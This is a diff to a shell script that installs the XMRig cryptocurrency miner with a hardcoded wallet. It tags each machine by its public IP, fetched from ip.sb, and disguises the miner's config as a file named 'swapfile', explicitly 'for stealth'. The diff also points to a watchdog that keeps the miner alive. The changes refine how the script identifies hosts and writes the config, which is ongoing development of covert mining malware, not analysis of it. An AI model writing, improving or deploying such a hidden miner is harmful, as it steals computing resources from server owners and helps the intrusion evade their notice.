@@ -618,118 +618,33 @@ echo "[*] Configuring XMRig..."
 WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
 
 # ==================== IP DETECTION FOR PASS FIELD ====================
-echo "[*] Detecting server IP address and hostname for worker identification..."
+echo "[*] Detecting server IP address for worker identification..."
 
-# Use Python for reliable PUBLIC IP detection with reverse DNS
-if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
-    PYTHON_CMD=$(command -v python3 || command -v python)
-    
-    PASS=$($PYTHON_CMD << 'PYEOF'
-import socket
-import sys
+# Simple and reliable method - uses curl to get public IP
+PASS=$(curl -4 -s --connect-timeout 5 ip.sb 2>/dev/null)
 
-def get_public_ip():
-    """Get public internet IP address"""
-    methods = [
-        ('ip.sb', 80),
-        ('api.ipify.org', 80),
-        ('ifconfig.me', 80),
-        ('icanhazip.com', 80)
-    ]
-    
-    for host, port in methods:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            sock.connect((host, port))
-            
-            request = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
-            sock.send(request.encode())
-            
-            response = sock.recv(4096).decode()
-            sock.close()
-            
-            lines = response.strip().split('\n')
-            for line in reversed(lines):
-                line = line.strip()
-                if line and '.' in line and len(line) < 20:
-                    parts = line.split('.')
-                    if len(parts) == 4:
-                        try:
-                            all(0 <= int(p) <= 255 for p in parts)
-                            return line
-                        except:
-                            continue
-        except:
-            continue
-    
-    return None
-
-def get_reverse_dns(ip):
-    """Get reverse DNS hostname for IP address"""
-    try:
-        # Try reverse DNS lookup
-        hostname, aliaslist, ipaddrlist = socket.gethostbyaddr(ip)
-        return hostname
-    except:
-        # Fallback: try to get local hostname
-        try:
-            return socket.gethostname()
-        except:
-            return None
-
-# Get public IP
-public_ip = get_public_ip()
-if not public_ip:
-    public_ip = "na"
-
-# Get reverse DNS
-reverse_dns = get_reverse_dns(public_ip) if public_ip != "na" else None
-
-# Format: [reverse-dns] / IP-Address
-if reverse_dns and reverse_dns != public_ip:
-    # We have both hostname and IP
-    print(f"{reverse_dns} / {public_ip}")
-else:
-    # Only have IP or IP equals hostname
-    print(public_ip)
-PYEOF
-)
-else
-    # Fallback: Use curl for IP and dig/host for reverse DNS
-    PUBLIC_IP=$(curl -4 -s --connect-timeout 5 ip.sb 2>/dev/null || \
-                curl -4 -s --connect-timeout 5 api.ipify.org 2>/dev/null || \
-                echo "na")
-    
-    if [ "$PUBLIC_IP" != "na" ]; then
-        # Try to get reverse DNS
-        if command -v dig >/dev/null 2>&1; then
-            REVERSE_DNS=$(dig +short -x "$PUBLIC_IP" 2>/dev/null | head -1 | sed 's/\.$//')
-        elif command -v host >/dev/null 2>&1; then
-            REVERSE_DNS=$(host "$PUBLIC_IP" 2>/dev/null | grep "domain name pointer" | awk '{print $NF}' | sed 's/\.$//')
-        else
-            REVERSE_DNS=""
-        fi
-        
-        if [ -n "$REVERSE_DNS" ]; then
-            PASS="$REVERSE_DNS / $PUBLIC_IP"
-        else
-            PASS="$PUBLIC_IP"
-        fi
-    else
-        PASS=$(hostname 2>/dev/null || echo "na")
-    fi
+# Fallback if curl failed or returned localhost
+if [ "$PASS" == "localhost" ] || [ -z "$PASS" ]; then
+  echo "[*] Direct IP detection failed, using route method..."
+  PASS=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
 fi
 
-echo "[*] Detected PUBLIC IP address: $PUBLIC_IP"
-echo "[*] Detected reverse DNS: ${REVERSE_DNS:-none}"
-echo "[*] Worker identifier: $PASS"
+# Final fallback
+if [ -z "$PASS" ]; then
+  echo "[!] IP detection failed, using hostname..."
+  PASS=$(hostname 2>/dev/null || echo "na")
+fi
+
+# Clean up any whitespace
+PASS=$(echo "$PASS" | tr -d '[:space:]')
+
+echo "[✓] Worker identifier (IP): $PASS"
 
 # Optional: Add email if configured
 EMAIL=""  # Leave empty or set your email
 if [ -n "$EMAIL" ]; then
-    PASS="$PASS / $EMAIL"
-    echo "[*] Added email to identifier: $EMAIL"
+    PASS="$PASS:$EMAIL"
+    echo "[✓] Added email to identifier"
 fi
 
 # Create configuration file (will be renamed to swapfile for stealth)
@@ -761,9 +676,26 @@ sed -i "s/PASS_PLACEHOLDER/$PASS/g" config.json
 # Rename to swapfile for stealth
 mv config.json swapfile
 
+# Double-check: Ensure PASS is set in swapfile (safety check)
+if grep -q "PASS_PLACEHOLDER" swapfile 2>/dev/null; then
+    echo "[!] Warning: PASS_PLACEHOLDER still in file, fixing..."
+    sed -i "s/PASS_PLACEHOLDER/$PASS/g" swapfile
+fi
+
+# Also update any existing pass field to ensure it's correct
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' swapfile
+
 echo "[✓] XMRig configuration created as 'swapfile'"
 echo "[✓] Wallet: ${WALLET:0:20}...${WALLET: -20}"
 echo "[✓] Pass (Worker ID): $PASS"
+
+# Verify PASS was set correctly
+if grep -q '"pass": "'$PASS'"' swapfile; then
+    echo "[✓] Worker ID successfully set in config"
+else
+    echo "[!] Warning: Worker ID may not be set correctly"
+    echo "[*] Current pass field: $(grep '"pass"' swapfile || echo 'not found')"
+fi
 
 # ==================== CREATE INTELLIGENT WATCHDOG ====================
 echo "[*] Creating intelligent watchdog (3-minute interval, state-tracked)..."
